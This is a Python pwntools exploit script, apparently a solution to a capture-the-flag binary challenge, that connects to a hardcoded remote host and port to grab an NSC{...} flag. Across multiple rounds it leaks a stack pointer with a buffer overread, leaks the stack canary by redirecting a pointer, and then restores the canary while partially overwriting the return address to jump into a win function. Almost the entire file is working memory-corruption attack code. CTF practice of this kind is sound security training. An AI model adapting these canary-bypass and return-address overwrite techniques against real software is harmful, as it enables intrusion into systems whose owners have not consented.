#!/usr/bin/env python3
from pwn import *
import re

context.binary = elf = ELF("./chall", checksec=False)
context.arch = "amd64"

HOST = "34.123.57.171"
PORT = 42059

# Stack/frame offsets in challenge()
OFF_SRC_PTR = 0x20
OFF_CANARY = 0x38
OFF_RET = 0x48

# win() starts with push rbp; returning there directly misaligns stack for system().
# Jump to win+1 (mov rbp, rsp) to preserve alignment for the subsequent call.
WIN_PLUS_ONE_LOW16 = 0x11AA

FLAG_RE = re.compile(rb"NSC\{[^\n\r}]*\}")


def start(local: bool):
    if local:
        return process([elf.path])
    return remote(HOST, PORT)


def recv_round_prompt(io, idx: int):
    io.recvuntil(f"[{idx}] > ".encode())


def solve_once(local: bool = False):
    io = start(local)

    try:
        # Round 1: leak src pointer (rbp-0x30) via You said overread without corrupting it.
        recv_round_prompt(io, 1)
        p1 = b"A" * OFF_SRC_PTR
        io.send(p1)

        io.recvuntil(b"You said: ")
        line1 = io.recvline(keepends=False)
        if not line1.startswith(p1):
            return None

        leak1 = line1[len(p1):]
        if len(leak1) < 6:
            return None

        src_ptr = u64(leak1[:6].ljust(8, b"\x00"))  # rbp-0x30
        canary_addr = src_ptr + 0x28

        # Round 2: set src to canary+1 and leak 7 canary tail bytes via Correct: %s.
        recv_round_prompt(io, 2)
        p2 = b"B" * OFF_SRC_PTR + p64(canary_addr + 1)
        io.send(p2)

        io.recvuntil(b"Correct: ")
        canary_tail_line = io.recvline(keepends=False)
        if len(canary_tail_line) < 7:
            return None

        canary = b"\x00" + canary_tail_line[:7]

        # Rounds 3..29: short inputs, do not touch canary/return address.
        for i in range(3, 30):
            recv_round_prompt(io, i)
            io.send(b"Z")

        # Round 30: restore canary and partially overwrite return address to win+1.
        recv_round_prompt(io, 30)

        payload = bytearray(b"C" * (OFF_RET + 2))
        payload[0x10:0x12] = b"Q\x00"       # short string used by strcpy source
        payload[OFF_SRC_PTR:OFF_SRC_PTR + 8] = p64(src_ptr)
        payload[OFF_CANARY:OFF_CANARY + 8] = canary
        payload[0x40:0x48] = b"D" * 8
        payload[OFF_RET:OFF_RET + 2] = p16(WIN_PLUS_ONE_LOW16)

        io.send(bytes(payload))

        out = io.recvall(timeout=2)
        flag_match = FLAG_RE.search(out)
        flag = flag_match.group(0) if flag_match else None
        return out, flag

    except EOFError:
        return None
    finally:
        io.close()


def main():
    local = args.LOCAL
    attempts = int(args.ATTEMPTS) if args.ATTEMPTS else 20

    for attempt in range(1, attempts + 1):
        result = solve_once(local=local)
        if result is None:
            log.warning(f"Attempt {attempt}/{attempts}: retrying")
            continue

        out, flag = result
        log.info(f"Attempt {attempt}/{attempts}: got {len(out)} bytes")
        print(out.decode("latin-1", errors="ignore"))

        if flag:
            success(f"Flag: {flag.decode()}")
            return

    failure("No flag recovered within attempt budget")


if __name__ == "__main__":
    main()
